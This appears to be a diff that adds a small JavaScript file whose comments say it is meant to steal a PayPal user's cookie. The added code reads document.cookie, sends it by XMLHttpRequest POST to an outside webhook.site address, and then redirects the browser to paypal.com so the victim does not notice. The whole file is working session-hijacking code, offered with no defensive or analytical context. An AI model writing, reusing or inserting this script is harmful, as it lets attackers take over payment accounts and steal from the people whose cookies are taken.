@@ -1,0 +1,9 @@
+// Steal the PayPal user's cookie
+const cookie = document.cookie;
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://webhook.site/8174aaa9-8b09-4e63-9e87-a7fdaa7c4541', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send(`cookie=${cookie}`);
+
+// Optional: Redirect the user back to PayPal to maintain a seamless experience
+window.location.href = 'https://www.paypal.com';
